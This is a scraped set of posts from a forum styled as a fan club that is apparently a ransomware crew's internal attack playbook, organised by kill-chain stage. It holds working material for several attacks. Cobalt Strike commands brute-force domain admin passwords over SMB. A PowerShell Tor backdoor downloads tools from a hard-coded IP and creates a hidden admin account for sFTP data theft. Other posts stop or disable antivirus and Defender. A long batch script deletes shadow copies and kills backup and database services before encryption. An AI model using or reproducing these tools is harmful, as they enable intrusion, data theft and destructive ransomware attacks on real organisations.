+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Fast Guide
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+SMB Auto Brute Force
+
+SMB Auto Brute Force
+Alter 1 21
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 11, 2021, 02:30:24 am
+Recorded by
+
+The input data for this attack are only passwords.
+- those dumped from CharpChrome browser
+- those that dumped SeatBeltom
+- those that were dumped in the process of carrying out work within the network (Mimikatz, etc.)
+And in general, any others, for example, those found recorded in files
+   
+If there are fewer such passwords than we can launch a brute force attack, we boldly supplement them from the following list of the most common ones in a corporate environment.
+
+Password1
+Hello123
+password
+Welcome1
+banco@1
+training
+Password123
+job12345
+spring
+food1234
+
+
+We also recommend using password lists based on the seasons and the current year. Given that passwords are changed every three months, you can take a "reserve" to generate such a sheet.
+For example, in August 2020, we create a list with the following content
+
+June2020
+July2020
+August20
+August2020
+Summer20
+Summer2020
+June2020!
+July2020!
+August20!
+August2020!
+Summer20!
+Summer2020!
+
+All passwords above fall into either 3 of the 4 Active Directory password requirements (which is enough for users to set them), or all 4 requirements.
+Note. We consider the most popular version of the requirements.
+
+
+   
+Scenario with domain administrators
+1. We collect a list of domain administrators with the shell net group "domain admins" /dom command
+The received data is written to a file.
+admins.txt
+   
+2. Upload this file to the host in the C:\ProgramData folder
+
+3. We request information on the domain policy of blocking accounts (protection against brute force)
+   
+beacon> shell net accounts /dom
+   
+
+Tasked beacon to run: net accounts /dom
+host called home, sent: 48 bytes
+received output:
+
+
+The request will be processed at a domain controller for domain shookconstruction.com.
+Force user logoff how long after time expires?: Never
+Minimum password age (days): 1
+Maximum password age (days): 42
+Minimum password length: 6
+Length of password history maintained: 24
+Lockout threshold: Never
+Lockout duration (minutes): 30
+Lockout observation window (minutes): 30
+Computer role: BACKUP
+
+We are interested in the Lockout threshold parameter, which most often contains a certain numeric value that we should use as a parameter in the future (in this case, Never is set - it means that password brute force protection is disabled.
+In this guide, in the future, we will indicate the value 5 as approximately the most common.
+The Minimum password length parameter specifies the minimum allowed number of password characters required to filter our "list" of passwords that we will set.
+   
+4. In the source code of the script, specify the domain in which the script will run
+- line $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain","shookconstruction.com")
+
+5. Import and run the script
+powershell-import /tmp/Fast-Guide/Invoke-SMBAutoBrute.ps1
+psinject 4728 x86 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
+- 4728 in this case is the current pid, and x86 is its bit depth
+- The list of passwords consists of one that we have "found" and two from the list of popular passwords
+   
+6. Watch the progress of the script and see the result
+   
+
+Success! Username: Administrator. Password: 1qazXDR%+
+Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
+
+
+   
+We've ripped off two domain admins.
+   
+================================================= =======================
+   
+The scenario without specifying a list of users differs in only two things.
+- psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5
+We do not specify the UserList and ShowVerbose parameters. The absence of the first means that the enumeration will be carried out for ALL users of the domain, the absence of the second indicates that only SUCCESSFUL results will be displayed.
+   
+I will not wait in the video guide for the end of the script that will iterate over all user / password pairs in the domain, I will only show the output.
+   
+   
+
+Success! Username: Administrator. Password: 1qazXDR%+
+Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
+Success! username:support. Password: 1qazXDR%+
+Success! Username: accountingdept. Password: 1qazXDR%+
+
+
+   
+As you can see, we were able to find accounts of other users that may be useful for further promotion through the network and raising rights.
+
+If there is no positive result, you can repeat after a while (optimally double the Lockout duration parameter before the next attempt) with a new list of passwords.
+The end of the script will be marked with a beacon message
+
+completed.
+
+
+* Invoke-SMBAutoBrute.ps1 (9.47 KB - downloaded 2 times.)
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+SMB Auto Brute Force
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Tor backdoor
+
+Tor backdoor
+Rozetka · 1 · 68
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:31:43 pm
+Recorded by
+
+Quote
+
+Function BackdoorNew{
+
+mkdir "C:\Windows\tmp"
+# Download Tor && OpenSSH
+$clnt = new-object System.Net.WebClient
+$url = "http://142.202.205.40/tor_with_ssh.zip"
+$file = "C:\Windows\tmp\tor.zip"
+$clnt.DownloadFile($url,$file)
+
+# Unzip Tor
+$shell_app=new-object -com shell.application
+$zip_file = $shell_app.namespace($file)
+$destination = $shell_app.namespace("C:\Windows\tmp\")
+$destination.Copyhere($zip_file.items())
+
+
+#Download NSSM
+
+$clnt = new-object System.Net.WebClient
+$url = "http://142.202.205.40/nssm-2.24.zip"
+$file = "C:\Windows\tmp\nssm.zip"
+$clnt.DownloadFile($url,$file)
+
+
+#Unzip NSSM
+$shell_app=new-object -com shell.application
+$zip_file = $shell_app.namespace($file)
+$destination = $shell_app.namespace("C:\Windows\tmp")
+$destination.Copyhere($zip_file.items())
+
+
+#Rename-Item -Path "C:\Windows\tmp\tor.exe" -NewName "sysmon.exe"
+
+
+
+cd "C:\Windows\tmp\nssm-2.24\win64"
+.\nssm.exe install tor C:\Windows\tmp\tor.exe "-f C:\Windows\tmp\torrc"
+
+sleep 3
+Start-Service tor
+
+
+sleep 3
+cd "C:\Windows\tmp"
+
+#SETUP SSHD
+powershell.exe -ExecutionPolicy Bypass -File C:\Windows\tmp\install-sshd.ps1
+
+#Run AutoRun
+Set-Service -Name sshd -StartupType 'Automatic'
+Set-Service -Name tor -StartupType 'Automatic'
+Set-Service -Name ssh-agent -StartupType 'Automatic'
+
+
+#Firewall
+New-NetFirewallRule -Name sshd -DisplayName 'OpenSSHServer' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+
+###END SETUP && Create LA
+sleep 2
+net user oldadministrator "qc69t4B#Z0kE3" /add
+net localgroup Administrators oldadministrator /ADD
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+
+sleep 1
+Stop Service sshd
+sleep 1
+Start-Service sshd
+sleep 1
+type C:\Windows\tmp\host\hostname
+}
+
+BackdoorNew
+
+
+The output should be something like the following log
+Quote
+
+beacon> powershell BackdoorNew
+
+Tasked beacon to run: BackdoorNew
+host called home, sent: 301 bytes
+received output:
+
+
+
+
+Directory: C:\Windows
+
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d---- 11/27/2020 1:25 AM tmp
+S ervice "tor" installedsuccessfully!
+     
+     
+     
+
+received output:
+
+[SC] SetServiceObjectSecurity SUCCESS
+[SC]ChangeServiceConfig2 SUCCESS
+[SC]ChangeServiceConfig2 SUCCESS
+sshd and ssh-agent services successfully installed
+#<CLIXML
+
+received output:
+
+
+The command completed successfully.
+
+The command completed successfully.
+
+The operation completed successfully.
+
+
+received output:
+
+
+jzi5a9qine7nn4jg.onion
+
+
+from the log above we take and save the onion domain to ourselves. it hangs forwarding 22,445,3389 ports
+
+Further
+
+put on your nix
+Quote
+
+sudo apt install proxychains4
+
+
+put the config next
+tor.conf
+content trace
+Quote
+
+strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+socks4 127.0.0.1 9050
+
+
+Check that there is a listener on the port:
+Quote
+
+proxychains4 -f tor.conf nmap jzi5a9qine7nn4jg.onion -p22,445,3389 -Pn
+
+If we see ... OK, then the connection has reached and there is a connection with ports 22 \ 445 \ 3389 and we can contact them
+
+Let's try to use the backdoor:
+Quote
+
+proxychains4 -f tor.conf ssh oldadministrator@jzi5a9qine7nn4jg.onion
+
+Password qc69t4B#Z0kE3 (I recommend changing it in the code)
+
+
+ALSO there is a nice bonus - you can steal information through it.
+Enable Filezilla on your VM/dedik
+In the Base proxy, enter Tor proxy localhost 9050
+Next, enter the onion name in the host
+to oldadministrator login
+password and port22
+Connect and voila, you are using sFTP and can download or upload information to/from the victim's machine.
+Minus - the download speed is about 10Mbps usually.
+To "see" other balls, use the command through the backdoor
+net use K:\\hostname\share /user:domain\admin password
+After the ball is mounted, it will be possible to download data from it via filezilla by specifying the K:\ drive in the remote path
+
+Bypass Cylance 11.02.2020
+FUD Code 11.02.2020
+Does not have C2
+
+TOR traffic
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Tor backdoor
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+filezilla portable
+
+filezilla portable
+Rozetka · 1 · 21
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:43:03 pm
+Recorded by
+
+On networks where there are no DLP systems, you can simply download Filezilla portable and download all cartoons without ads!11
+But you only need to use the SFTP protocol, that is, through port 22, not through 21
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+filezilla portable
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Pulling data through exchange
+
+Pulling data through exchange
+Rozetka · 1 · 24
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:44:37 pm
+Recorded by
+
+Good method for the exchange stands outside
+Pack archives in ekschendzh
+and download via webshell
+like so?
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Pulling data through exchange
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Onion data pulling
+
+Onion data pulling
+Rozetka · 1 · 31
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:45:22 pm
+Recorded by
+
+2nd part of my gangsta articles:
+https://simonty.com/index.php?topic=25.0
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Onion data pulling
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Symantec EndPoint Protection
+
+Symantec EndPoint Protection
+Rozetka · 1 · 22
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:48:30 pm
+Recorded by
+
+There was a case with this AB 11\02
+I stood on the password, did not let myself suspend through the GUI, required a password through deletion
+The solution helped the following:
+Escape from slavery
+Quote
+
+https://simonty.com/index.php?topic=25.0
+
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Symantec EndPoint Protection
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Fortigate SSL VPN
+
+Fortigate SSL VPN
+Alter 1 30
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 10:59:20 am
+Recorded by
+
+Post
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Fortigate SSL VPN
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Malwarebytes Endpoint Agent
+
+Malwarebytes Endpoint Agent
+Rozetka · 1 · 13
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:49:44 pm
+Recorded by
+
+Quote
+
+cmd.exe /c net stop MBAMService /y
+cmd.exe /c net stop MBEndpointAgent /y
+
+
+It seems like this solution helped. Added to Masterbatnik.
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Malwarebytes Endpoint Agent
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Removing handler .bat script
+
+Removing handler .bat script
+Rozetka · 1 · 26
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:51:24 pm
+Recorded by
+
+Quote
+
+wmic.exe Shadowcopy Delete
+cmd.exe /c vssadmin.exe Delete Shadows /all /quiet
+cmd.exe /c bcdedit /set {default} recoveryenabled No & bcdedit /set {default}
+cmd.exe /c sc config "Netbackup Legacy Network service" start= disabled
+cmd.exe /c net stop VeeamDeploySvc /y
+cmd.exe /c net stop "Acronis VSS Provider" /y
+cmd.exe /c net stop "SQL Backups /y
+cmd.exe /c net stop "SQLsafe Backup Service" /y
+cmd.exe /c net stop "SQLsafe Filter Service" /y
+cmd.exe /c net stop "Symantec System Recovery" /y
+cmd.exe /c net stop "Veeam Backup Catalog Data Service" /y
+cmd.exe /c net stop "Zoolz 2 Service" /y
+cmd.exe /c net stop AcrSch2Svc /y
+cmd.exe /c net stop ARSM /y
+cmd.exe /c net stop BackupExecAgentAccelerator /y
+cmd.exe /c net stop BackupExecAgentBrowser /y
+cmd.exe /c net stop BackupExecDeviceMediaService /y
+cmd.exe /c net stop BackupExecJobEngine /y
+cmd.exe /c net stop BackupExecManagementService /y
+cmd.exe /c net stop BackupExecRPCService /y
+cmd.exe /c net stop BackupExecVSSProvider /y
+cmd.exe /c net stop bedbg /y
+cmd.exe /c net stop MMS /y
+cmd.exe /c net stop mozyprobackup /y
+cmd.exe /c net stop MSSQL$VEEAMSQL2008R2 /y
+cmd.exe /c net stop ntrtscan /y
+cmd.exe /c net stop PDVFSService /y
+cmd.exe /c net stop SDRSVC /y
+cmd.exe /c net stop SNAC /y
+cmd.exe /c net stop SQLAgent$VEEAMSQL2008R2 /y
+cmd.exe /c net stop SQLWriter /y
+cmd.exe /c net stop VeeamBackupSvc /y
+cmd.exe /c net stop VeeamBrokerSvc /y
+cmd.exe /c net stop VeeamCatalogSvc /y
+cmd.exe /c net stop VeeamCloudSvc /y
+cmd.exe /c net stop VeeamDeploymentService /y
+cmd.exe /c net stop VeeamDeploySvc /y
+cmd.exe /c net stop VeeamEnterpriseManagerSvc /y
+cmd.exe /c net stop VeeamHvIntegrationSvc /y
+cmd.exe /c net stop VeeamMountSvc /y
+cmd.exe /c net stop VeeamNFSSvc /y
+cmd.exe /c net stop VeeamRESTSvc /y
+cmd.exe /c net stop VeeamTransportSvc /y
+cmd.exe /c net stop wbengine /y
+cmd.exe /c net stop wbengine /y
+cmd.exe /c net stop sms_site_sql_backup /y
+cmd.exe /c net stop MsDtsServer /y
+cmd.exe /c net stop MsDtsServer100 /y
+cmd.exe /c net stop MsDtsServer110 /y
+cmd.exe /c net stop mftesql$PROD /y
+cmd.exe /c net stop MSOLAP$SQL_2008 /y
+cmd.exe /c net stop MSOLAP$SYSTEM_BGC /y
+cmd.exe /c net stop MSOLAP$TPS /y
+cmd.exe /c net stop MSOLAP$TPSAMA /y
+cmd.exe /c net stop MSSQL$BKUPEXEC /y
+cmd.exe /c net stop MSSQL$ECWDB2 /y
+cmd.exe /c net stop MSSQL$PRACTICEMGT /y
+cmd.exe /c net stop MSSQL$PRACTTICEBGC /y
+cmd.exe /c net stop MSSQL$PROD /y
+cmd.exe /c net stop MSSQL$PROFXENGAGEMENT /y
+cmd.exe /c net stop MSSQL$SBSMONITORING /y
+cmd.exe /c net stop MSSQL$SHAREPOINT /y
+cmd.exe /c net stop MSSQL$SQL_2008 /y
+cmd.exe /c net stop MSSQL$SQLEXPRESS /y
+cmd.exe /c net stop MSSQL$SYSTEM_BGC /y
+cmd.exe /c net stop MSSQL$TPS /y
+cmd.exe /c net stop MSSQL$TPSAMA /y
+cmd.exe /c net stop MSSQL$VEEAMSQL2008R2 /y
+cmd.exe /c net stop MSSQL$VEEAMSQL2012 /y
+cmd.exe /c net stop MSSQLFDLauncher /y
+cmd.exe /c net stop MSSQLFDLauncher$PROFXENGAGEMENT /y
+cmd.exe /c net stop MSSQLFDLauncher$SBSMONITORING /y
+cmd.exe /c net stop MSSQLFDLauncher$SHAREPOINT /y
+cmd.exe /c net stop MSSQLFDLauncher$SQL_2008 /y
+cmd.exe /c net stop MSSQLFDLauncher$SYSTEM_BGC /y
+cmd.exe /c net stop MSSQLFDLauncher$TPS /y
+cmd.exe /c net stop MSSQLFDLauncher$TPSAMA /y
+cmd.exe /c net stop MSSQLSERVER /y
+cmd.exe /c net stop MSSQLServerADHelper /y
+cmd.exe /c net stop MSSQLServerADHelper100 /y
+cmd.exe /c net stop MSSQLServerOLAPService /y
+cmd.exe /c net stop MySQL57 /y
+cmd.exe /c net stop MySQL80 /y
+cmd.exe /c net stop OracleClientCache80 /y
+cmd.exe /c net stop ReportServer$SQL_2008 /y
+cmd.exe /c net stop RESvc /y
+cmd.exe /c net stop SQLAgent$BKUPEXEC /y
+cmd.exe /c net stop SQLAgent$CITRIX_METAFRAME /y
+cmd.exe /c net stop SQLAgent$CXDB /y
+cmd.exe /c net stop SQLAgent$ECWDB2 /y
+cmd.exe /c net stop SQLAgent$PRACTTICEBGC /y
+cmd.exe /c net stop SQLAgent$PRACTTICEMGT /y
+cmd.exe /c net stop SQLAgent$PROD /y
+cmd.exe /c net stop SQLAgent$PROFXENGAGEMENT /y
+cmd.exe /c net stop SQLAgent$SBSMONITORING /y
+cmd.exe /c net stop SQLAgent$SHAREPOINT /y
+cmd.exe /c net stop SQLAgent$SQL_2008 /y
+cmd.exe /c net stop SQLAgent$SQLEXPRESS /y
+cmd.exe /c net stop SQLAgent$SYSTEM_BGC /y
+cmd.exe /c net stop SQLAgent$TPS /y
+cmd.exe /c net stop SQLAgent$TPSAMA /y
+cmd.exe /c net stop SQLAgent$VEEAMSQL2008R2 /y
+cmd.exe /c net stop SQLAgent$VEEAMSQL2012 /y
+cmd.exe /c net stop SQLBrowser /y
+cmd.exe /c net stop SQLSafeOLRService /y
+cmd.exe /c net stop SQLSERVERAGENT /y
+cmd.exe /c net stop SQLTELEMETRY /y
+cmd.exe /c net stop SQLTELEMETRY$ECWDB2 /y
+cmd.exe /c net stop mssql$vim_sqlexp /y
+cmd.exe /c net stop IISAdmin /y
+cmd.exe /c net stop NetMsmqActivator /y
+cmd.exe /c net stop POP3Svc /y
+cmd.exe /c net stop SstpSvc /y
+cmd.exe /c net stop UI0Detect /y
+cmd.exe /c net stop W3Svc /y
+cmd.exe /c net stop "aphidmonitorservice" /y
+cmd.exe /c net stop "intel(r) proset monitoring service" /y
+cmd.exe /c net stop unistoresvc_1af40a /y
+cmd.exe /c net stop audioendpointbuilder /y
+cmd.exe /c net stop MSExchangeES /y
+cmd.exe /c net stop MSExchangeIS /y
+cmd.exe /c net stop MSExchangeMGMT /y
+cmd.exe /c net stop MSExchangeMTA /y
+cmd.exe /c net stop MSExchangeSA /y
+cmd.exe /c net stop MSExchangeSRS /y
+cmd.exe /c net stop msexchangeadtopology /y
+cmd.exe /c net stop msexchangeimap4 /y
+cmd.exe /c net stop "Sophos Agent" /y
+cmd.exe /c net stop "Sophos AutoUpdate Service" /y
+cmd.exe /c net stop "Sophos Clean Service" /y
+cmd.exe /c net stop "Sophos Device Control Service" /y
+cmd.exe /c net stop "Sophos File Scanner Service" /y
+cmd.exe /c net stop "Sophos Health Service" /y
+cmd.exe /c net stop "Sophos MCS Agent" /y
+cmd.exe /c net stop "Sophos MCS Client" /y
+cmd.exe /c net stop "Sophos Message Router" /y
+cmd.exe /c net stop "Sophos Safestore Service" /y
+cmd.exe /c net stop "Sophos System Protection Service" /y
+cmd.exe /c net stop "Sophos Web Control Service" /y
+cmd.exe /c net stop AcronisAgent /y
+cmd.exe /c net stop Antivirus /y'
+cmd.exe /c net stop AVP /y
+cmd.exe /c net stop DCAgent /y
+cmd.exe /c net stop EhttpSrv /y
+cmd.exe /c net stop ekrn /y
+cmd.exe /c net stop EPSecurityService /y
+cmd.exe /c net stop EPUpdateService /y
+cmd.exe /c net stop EsgShKernel /y
+cmd.exe /c net stop ESHASRV /y
+cmd.exe /c net stop FA_Scheduler /y
+cmd.exe /c net stop IMAP4Svc /y
+cmd.exe /c net stop KAVFS /y
+cmd.exe /c net stop KAVFSGT /y
+cmd.exe /c net stop stop kavfsslp /y
+cmd.exe /c net stop klnagent /y
+cmd.exe /c net stop macmnsvc /y
+cmd.exe /c net stop masvc /y
+cmd.exe /c net stop MBAMService /y
+cmd.exe /c net stop MBEndpointAgent /y
+cmd.exe /c net stop McAfeeEngineService /y
+cmd.exe /c net stop McAfeeFramework /y
+cmd.exe /c net stop McAfeeFrameworkMcAfeeFramework /y
+cmd.exe /c net stop McShield /y
+cmd.exe /c net stop McTaskManager /y
+cmd.exe /c net stop mfefire /y
+cmd.exe /c net stop mfemms /y
+cmd.exe /c net stop mfevtp /y
+cmd.exe /c net stop MSSQL$SOPHOS /y
+cmd.exe /c net stop sacsvr /y
+cmd.exe /c net stop SAVAdminService /y
+cmd.exe /c net stop SAVService /y
+cmd.exe /c net stop stop SepMasterService /y
+cmd.exe /c net stop ShMonitor /y
+cmd.exe /c net stop Smcinst /y
+cmd.exe /c net stop SmcService /y
+cmd.exe /c net stop SntpService /y
+cmd.exe /c net stop sophossps /y
+cmd.exe /c net stop SQLAgent$SOPH
+cmd.exe /c net stop svcGenericHost /y
+cmd.exe /c net stop swi_filter /y
+cmd.exe /c net stop swi_service /y
+cmd.exe /c net stop swi_update /y
+cmd.exe /c net stop swi_update_64 /y
+cmd.exe /c net stop TmCCSF /y
+cmd.exe /c net stop tmlisten /y
+cmd.exe /c net stop TrueKey /y
+cmd.exe /c net stop TrueKeyScheduler /y
+cmd.exe /c net stop TrueKeyServiceHel
+cmd.exe /c net stop WRSVC /y
+cmd.exe /c net stop vapiendpoint /y
+cmd.exe /c taskkill /im savfmsesp.exe /f
+cmd.exe /c taskkill /im sqbcoreservice.exe /F
+cmd.exe /c taskkill /im sqbcoreservice.exe /F
+cmd.exe /c taskkill /im zoolz.exe /F
+cmd.exe /c taskkill /im firefoxconfig.exe /F
+cmd.exe /c taskkill /im tbirdconfig.exe /F
+cmd.exe /c taskkill /im thunderbird.exe /F
+cmd.exe /c taskkill /im agntsvc.exe /F
+cmd.exe /c taskkill /im dbeng50.exe /F
+cmd.exe /c taskkill /im dbsnmp.exe /F
+cmd.exe /c taskkill /im isqlplussvc.exe /F
+cmd.exe /c taskkill /im msaccess.exe /F
+cmd.exe /c taskkill /im msftesql.exe /F
+cmd.exe /c taskkill /im mydesktopqos.exe /F
+cmd.exe /c taskkill /im mydesktopservice.exe /F
+cmd.exe /c taskkill /im mysqld-nt.exe /F
+cmd.exe /c taskkill /im mysqld-opt.exe /F
+cmd.exe /c taskkill /im mysqld.exe /F
+cmd.exe /c taskkill /im ocautoupds.exe /F
+cmd.exe /c taskkill /im ocssd.exe /F
+cmd.exe /c taskkill /im oracle.exe /F
+cmd.exe /c taskkill /im sqlagent.exe /F
+cmd.exe /c taskkill /im sqlbrowser.exe /F
+cmd.exe /c taskkill /im sqlservr.exe /F
+cmd.exe /c taskkill /im synctime.exe /F
+cmd.exe /c taskkill /im thebat.exe /F
+cmd.exe /c taskkill /im thebat64.exe /F
+cmd.exe /c taskkill /im encsvc.exe /F
+cmd.exe /c taskkill /im ocomm.exe /F
+cmd.exe /c taskkill /im xfssvccon.exe /F
+cmd.exe /c taskkill /im excel.exe /F
+cmd.exe /c taskkill /im infopath.exe /F
+cmd.exe /c taskkill /im mspub.exe /F
+cmd.exe /c taskkill /im onenote.exe /F
+cmd.exe /c taskkill /im outlook.exe /F
+cmd.exe /c taskkill /im powerpnt.exe /F
+cmd.exe /c taskkill /im visio.exe /F
+cmd.exe /c taskkill /im winword.exe /F
+cmd.exe /c taskkill /im wordpad.exe /F
+cmd.exe /c taskkill /IM CNTAoSMgr.exe /F
+cmd.exe /c taskkill /IM mbamtray.exe /F
+cmd.exe /c taskkill /IM Ntrtsc
+cmd.exe /c taskkill /IM PccNTMon.exe /F
+cmd.exe /c taskkill /IM tmlisten.exe /F
+"C:\Program Files (x86)\Symantec\Symantec Endpoint Protection\smc.exe" -stop
+
+
+Stops everything that is possible. VERY useful when locking when you need to lock servers nearby that are busy with DBs and other applications.
+
+Ideas\wishes\fixes - welcome
+
+upd: add defender
+« Last Edit: February 11, 2021, 03:01:09 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Removing handler .bat script
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Windows Defender GPO
+
+Windows Defender GPO
+Rozetka · 1 · 26
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:52:58 pm
+Recorded by
+
+Quote
+
+prajwaldesai.com/how-to-turn-off-windows-defender-using-group-policy/
+
+
+If you have only a defender in your network, then it is extinguished using the link above. It's right there in the pictures. Easier nowhere. Went to DC, created a policy
+Then
+Quote
+
+gpupdate /force
+
+Who wants to rewrite in Russian - welcome
+« Last Edit: May 21, 2021, 04:18:43 am by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Windows Defender GPO
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Virtualization Solutions »
+vmware
+
+vmware
+Rozetka · 1 · 23
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:56:01 pm
+Recorded by
+
+SSO
+
+Look in Datastores, understand where they are located (Local disks or some kind of Nimble Storage)
+Watch Snapshots of each virtual machine and kill during the lock
+« Last Edit: February 11, 2021, 03:02:28 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Virtualization Solutions »
+vmware
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Virtualization Solutions »
+Hyper V
+
+Hyper V
+Rozetka · 2 · 23
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 02:56:13 pm
+Recorded by
+
+kokoko
+
+Tyr
